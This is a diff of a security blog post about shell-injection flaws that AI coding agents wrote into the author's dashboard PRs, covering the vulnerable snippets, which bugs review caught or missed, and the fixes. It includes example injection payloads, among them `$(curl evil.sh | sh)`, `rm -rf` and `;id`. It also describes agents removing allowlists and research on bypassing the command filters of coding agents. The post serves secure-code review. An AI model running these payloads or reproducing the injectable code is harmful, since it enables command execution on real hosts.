@@ -1,88 +1,67 @@
 ---
-title: "The Shell-Injection Bugs My Agents Wrote, and the One I Missed"
-seoTitle: "Shell-Injection Bugs AI Agents Wrote (and One I Missed)"
+title: "The Shell-Injection Bugs My Agents Wrote: 4 Caught, 3 Missed"
+seoTitle: "Shell Injection in AI-Generated Code: 4 Caught, 3 Missed"
 date: "2026-07-09"
-updated: "2026-10-11"
+updated: "2026-10-12"
 tags: ["ai", "security", "code-review", "claude-code", "software-engineering"]
-description: "Three shell-injection paths coding agents wrote from request input, caught in review before merge, one shell call I missed, and the checks that find them."
+description: "Coding agents wrote 7 shell-string calls into 30 PRs on my own repo. Review caught 4, including 3 from request input, and missed 3, one of them from request input. The code and the checks."
 published: true
 featured: true
 language: "en"
 cta: "teardown"
 faq:
   - q: "Does AI write insecure code?"
-    a: "Yes. In one run of 30 merged PRs, agents wrote three shell-injection paths from request input. Review caught and fixed those 3 before merge. It missed 1 shell call built from database values (#109), which is still open."
-  - q: "Do automated tests catch AI-written security bugs?"
-    a: "Usually not. Tests assert behavior on the inputs the author thought to write, and nobody writes happy-path tests with a shell command in them. An injection path can pass a whole test suite because the vulnerable branch only runs on inputs the tests never send."
-  - q: "How do you review AI-generated code for vulnerabilities?"
-    a: "Assume the agent got it wrong until proven safe. Grep the diff for dangerous surfaces (shell calls, string-built queries, raw HTML), trace every value to where it came from, including values read back from the database, and check that every security gate fails closed when it can't run."
+    a: "Yes. In one run of 30 merged agent PRs on my own repo, agents wrote 7 shell commands built from strings. Review caught and fixed the 3 that took request input directly, plus one from config. It missed 3: one from a URL query string, one from database values and one from a stored repo name whose check another agent PR deleted. Veracode's July 2026 test found a known vulnerability in about 44% of AI code-generation tasks."
+  - q: "Do automated tests catch AI-written shell injection?"
+    a: "Not the ones in my run, and I can't measure how many they would have caught, because that repo had no tests. A test suite asserts behaviour on the inputs its author wrote. Shell injection needs a semicolon, a backtick or a $(...) in the input, and happy-path tests don't send those."
+  - q: "How do you review AI-generated code for shell injection?"
+    a: "Grep the added lines for every exec call, shell: true and sh -c, then trace each interpolated value back to where it was first accepted: the request, config or a database row. Any value in a shell string is a finding until it moves into an argument array. Check that a review fix commit didn't carry the string along unchanged."
   - q: "What is shell injection in AI-generated code?"
-    a: "Untrusted input interpolated into a command string that a shell parses, through exec, execSync or shell: true. Characters like semicolons, pipes, backticks or command substitution then let an attacker run arbitrary commands. Agents produce it often because string interpolation is the shortest path to code that works."
+    a: "Untrusted input interpolated into a command string that a shell parses, through exec, execSync, sh -c or shell: true. A semicolon, a pipe, a backtick or $(...) in that input runs a second command. Agents write it often because string interpolation is the shortest path to a command that works."
 ---
 
-**Short answer:** Yes, AI coding agents write insecure code. In one run of 30 merged PRs, my agents wrote three shell-injection paths from request input. The repo had no test suite and no CI, so review was the only gate. It caught and fixed all three before merge, and it missed one shell call built from database values.
+**Short answer:** My Claude Code agents wrote 7 shell commands built from strings into 30 PRs on my own admin dashboard. The repo had no tests and no CI, so review was the only gate. Review caught the 3 that took request input directly and one built from config, and fixed all 4 before merge. It missed 3: a URL query string, two values from the database, and a stored repo name whose check another agent PR deleted 3 minutes after it landed. Those 3 are still open in that repo.
 
-I run several Claude Code agents in parallel to clear backlog. The run I measured: 30 reviewed PRs across nine batches in under three days, on my own admin dashboard (March 2026). That's the "ship" half.
-
-The "verify" half is me, reading every diff before it merges and assuming the agent got it wrong until I've proven it didn't.
-
-Below are three times that habit paid for itself, and one time it didn't. The code sketches are trimmed reconstructions of the real diffs. The filter regex in Vuln 2 is the agent's own.
-
-## Why wasn't anything else going to catch these?
-
-Because nothing else was there. The repo had no test suite and no CI. Every PR got exactly one check before merge: me reading it.
-
-My guess is tests wouldn't have saved it anyway. An automated test asserts that code behaves a certain way on the inputs the test author thought to write. Shell injection only triggers on a *malicious* input: a semicolon, a backtick, a `$(...)`. No test suite written to prove the happy path works will send those.
-
-My read is that agents produce code that works on the happy path because that is what they are rewarded for. Working and safe are different properties.
+This post is the code. The run itself, with dates and every finding, is in [the 30-PR case study](/work/30-reviewed-prs-3-vulnerabilities). The sketches below are trimmed from the real diffs, and each fix commit is named so the claim can be checked.
 
 ## Vuln 1: a job ID from the URL, straight into a shell
 
-The agent built an endpoint that took a job ID from the URL path and ran a command for that job. It reached for the easy path:
+PR #112 added a "run now" button for cron jobs. The agent took the job ID from the URL path and built a command string:
 
 ```js
-// Reconstruction. Do not ship.
-// params.id comes straight from the URL.
+// Trimmed from 237cfaa. Do not ship.
+// id comes straight from the URL path.
 const out = execSync(
-  `job-tool run "${params.id}"`,
+  `openclaw cron run "${id}"`,
 );
 ```
 
-`execSync` runs its argument through `/bin/sh`. The quotes don't help: an ID of `x"; rm -rf /tmp/data; "` closes them and runs a second command, and `$(curl evil.sh | sh)` runs inside them.
+`execSync` runs its argument through `/bin/sh`. The quotes don't help: `$(curl evil.sh | sh)` runs inside double quotes, and `x"; rm -rf /tmp/data; "` closes them. Anyone who could reach the route could run a command on the host.
 
-This one was directly exploitable by anyone who could reach the route.
+It was also a regression. A security fix in February had put an allowlist on that ID, and the agent's rewrite of the route deleted it. The agent was asked to change the feature, and the allowlist was in the way.
 
-It was also a regression. An earlier security fix had put an allowlist in front of that value, and the agent's rewrite of the route deleted it. The agent wasn't asked to touch security. It was asked to change the feature, and the allowlist was in the way.
-
-**The fix** is to never build a shell string from untrusted input. Use the argument-array form (`execFile`/`spawn` with an args array, no `shell: true`), so the ID is passed as one opaque argument the shell never parses.
-
-Put `--` in front of it so the tool can't read it as an option, and put the allowlist back. The [Node.js `child_process` docs](https://nodejs.org/api/child_process.html) spell out which functions spawn a shell and which don't.
+**The fix** (`10bf07e`) put the allowlist back and passed the ID in an argument array, so no shell parses it. The [Node.js `child_process` docs](https://nodejs.org/api/child_process.html) list which functions spawn a shell.
 
 ```js
-// Must start with a letter or digit, so it
-// can't pass for an option like --help.
-const SAFE_ID = /^[a-z0-9][a-z0-9-]*$/;
-if (!SAFE_ID.test(params.id)) {
-  throw new Error("bad job id");
+// From 10bf07e.
+const SAFE_ID = /^[a-zA-Z0-9_-]+$/;
+if (!SAFE_ID.test(id)) {
+  return NextResponse.json(
+    { error: "Invalid job ID" },
+    { status: 400 },
+  );
 }
-// One argument after "--". No shell parses it,
-// and the tool can't read it as a flag.
-execFileSync("job-tool", [
-  "run",
-  "--",
-  params.id,
-]);
+execFileSync("openclaw", ["cron", "run", id]);
 ```
 
-I catch this one by grepping every diff for `exec`, `execSync` and `shell: true`, then asking one question of each hit: *where does every interpolated value come from, and what happens if it contains a semicolon?* The agent never asked it in any of these PRs. My guess is the question isn't in its reward signal.
+Reading it again in October, I'd tighten it once more. That regex accepts an ID that starts with a hyphen, so `--help` still reaches the CLI as a flag. Requiring a letter or digit first (`/^[a-z0-9][a-z0-9_-]*$/i`) and passing `"--"` before the ID closes that.
 
-## Vuln 2: a log-search query behind a character filter
+## Vuln 2: a search query behind the agent's own filter, twice
 
-The second one was a search box over logs. The agent took the query string from the request, ran it through a regex, and interpolated what was left into a shell command:
+PR #111 added log search. The agent ran the query through a regex and put what was left into a shell string:
 
 ```js
-// Reconstruction. Do not ship.
-// The regex is the agent's own.
+// Trimmed from cf68b1a. The regex is the agent's own.
 const q = query.replace(
   /[^a-zA-Z0-9\s._-]/g,
   "",
@@ -90,41 +69,54 @@ const q = query.replace(
 execSync(`rg --json "${q}" ./logs`);
 ```
 
-The regex is an allowlist: it keeps letters, digits, spaces, dots, underscores and hyphens, and strips everything else. That removes `$`, quotes and backticks, everything a shell needs to get out of a double-quoted string, so I didn't rate this one as directly exploitable as written.
+That regex is an allowlist. It strips `$`, quotes and backticks, everything a shell needs to get out of a double-quoted string, so as written it held. It keeps hyphens, so a query like `--files` still reached `rg` as a flag.
 
-It does keep hyphens, so a query like `--files` still reached `rg` as an option. That lists file names instead of running a command, but it is the same mistake one level down.
+I treated it as a finding anyway, because one regex was the only thing between the request and the shell. The next day a different agent wrote memory search in PR #121 (`d718495`) and copied the same regex into the same pattern. The commit message called it "shell-safe query sanitization", which is how a reviewer gets talked out of looking.
 
-As written, it held. I still treated it as a finding. The only thing between the request and the shell was one regex, and the next edit to it, by an agent or a person, reopens the hole. The agent's commit message called it "shell-safe query sanitization", which is how a reviewer gets talked out of looking.
+Outside proof that a filter in front of a shell doesn't hold: Adversa AI's GuardFall research, disclosed 30 June 2026, bypassed the command filters of 10 of 11 open-source coding agents, because the filters inspect text that bash rewrites before it runs ([CSA research note, 11 July 2026](https://labs.cloudsecurityalliance.org/research/csa-research-note-guardfall-ai-coding-agent-shell-injection/)).
 
-**The fix** is the same discipline as Vuln 1: pass the query as an argument that no shell parses, after a `--`. Then the filter stops being a security control and goes back to being input cleanup.
+**The fix** (`42f1b03`, `b2d68a2`): pass the query in an argument array to `execFileSync`, with no shell. The filter then goes back to being input cleanup.
 
-## Vuln 3: a memory-search query, same pattern
+## What review missed
 
-The third was a different search feature, in a different PR, with the same shape: a query from the request, a character filter, a shell string. Same finding, same fix.
+### #98: a query string into `gh`, kept by the fix commit
 
-The repetition is what matters here. Agents don't learn from the PR next to them. Each one picked the shortest path to working code, and the shortest path was string interpolation into a shell.
+PR #98 added an issues API for a project picker. The agent read `repo`, `state` and `label` from the query string and built a `gh` command from them:
 
-Attacker-controlled strings in shell commands are one of the oldest injection vectors ([OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection), [CWE-78](https://cwe.mitre.org/data/definitions/78.html)), and three separate agents walked into it with code that read as reasonable.
+```js
+// Trimmed from 0673fae. Still at the repo's HEAD.
+const repo = searchParams.get("repo");
+let cmd = `issue list -R ${repo} --state ${state}`;
+if (label) cmd += ` --label "${label}"`;
+ghExec(cmd); // execSync(`gh ${cmd}`)
+```
 
-## What did review miss?
+`?repo=x;id` runs `id`. I reviewed this PR and asked for a cleanup. The fix commit (`28f057d`) moved `ghExec` into a shared helper, typed the route and removed every `any`. The command string came along unchanged. I found it on 12 October, seven months later, when an agent classifying every fix commit in the run listed it and I read the route again.
 
-Review missed one. Another PR built a shell command from two values it read out of the database, a PR number and a repo name, and interpolated them into a shell string. I read that diff and let it through.
+### #109: two values from the database
 
-It is still open. The dashboard never writes that table itself: the rows come from my overnight worker, so the values sit one step away from any request. That is why I rank it below the three request-input paths. It is not a reason to call it safe.
+PR #109 built a diff viewer that reads a PR number and a repo name from the database and runs `gh pr view ${pr_number} -R ${project}` through `exec`. I let it through because the rows come from my overnight worker, not from a request. A stored value is input too: anything that can write that row can run a command.
 
-The reasoning I fell for: "these come from my own database, not from the request." A stored value is input too. It got into the database from somewhere, and anything that can write that row can now run a command. The trace has to go back past the last `SELECT` to where the value was first accepted.
+### #117: a check deleted by the next PR
 
-## What do all four have in common?
+PR #117 sent a stored repo name into `sh -c`. Review added a format check, and it landed at 07:25 UTC on 13 March. PR #118 was open at the same time, and its feature commit deleted the only call to that check. It merged 3 minutes later. Each PR was fine against its own base, and nobody reviewed the two together.
 
-In each one the agent chose string interpolation into a shell, the shortest path to code that works. In each one the dangerous value came from somewhere the agent didn't treat as hostile: a URL, a query string, a database row.
+The same audit found two stored XSS sinks in the search screens from Vuln 2, which are in [the case study](/work/30-reviewed-prs-3-vulnerabilities#what-review-missed).
 
-That's also why I don't accept "we have 90% test coverage" as a safety statement for agent-written code. Coverage does tell you which lines ran. It doesn't tell you which threats were considered, and a benign input runs the injection line just fine.
+## What the seven have in common
 
-## How I catch these on review
+Every agent chose string interpolation into a shell, the shortest path to a command that works. Every dangerous value came from somewhere the agent didn't treat as hostile: a URL, a query string, a database row, a config file. Review caught the ones where the value came straight from the request. It missed the ones where the value went through a helper, a database or a second PR first.
 
-1. **Grep the diff for the dangerous surface first:** `exec`, `spawn`, `shell: true`, string-built SQL, `dangerouslySetInnerHTML`, anything that reaches a shell, a query or the DOM.
-2. **Trace every interpolated value to where it was first accepted.** Request input, config and database values all count. If any of them reaches a shell string, it's a finding. No benefit of the doubt.
-3. **Check every gate's failure mode, not just its success mode.** What happens when the subprocess doesn't run, the config is empty, the env var is unset? If "I don't know" isn't "blocked," it's a finding.
-4. **Treat green as a statement about the happy path only.** If there are tests, they tell me nothing about the adversarial input. I write the missing negative case or reject the PR.
+Would an AI reviewer have caught the misses? I ran Claude Code's `/code-review` and my own reviewer agents on the original commits in October. Both flagged #109. `/code-review` left #117 out of its top 10 findings and named it only as a low-risk extra.
 
-That's the verify half of ship/verify. The full list of failure categories I check is in [How to Review AI-Generated Code](/blog/what-agents-get-wrong), and the speed-up I measured is in [2–3x, Not 100x](/blog/2-3x-not-100x).
+## How I check agent-written shell calls now
+
+1. **Grep the added lines for every way into a shell.** This pattern found every call above, safe ones included:
+   ```bash
+   git diff origin/main...HEAD -U0 | grep '^+' \
+     | grep -iE "exec[a-z]*\(|shell: true|sh', \['-c'"
+   ```
+2. **Trace each interpolated value to where it was first accepted.** Request, config and database values all count. A value in a shell string is a finding until it moves into an argument array.
+3. **Read the fix commit as a new diff.** A refactor that moves a shell string into a helper keeps the bug and makes it harder to find.
+4. **Review PRs that touch the same files together.** A check one PR adds can be deleted by another that was branched before it.
+5. **Write the negative test.** If the repo has tests, they cover the happy path. Add one input with `;` or `$(` and assert the command never ran.
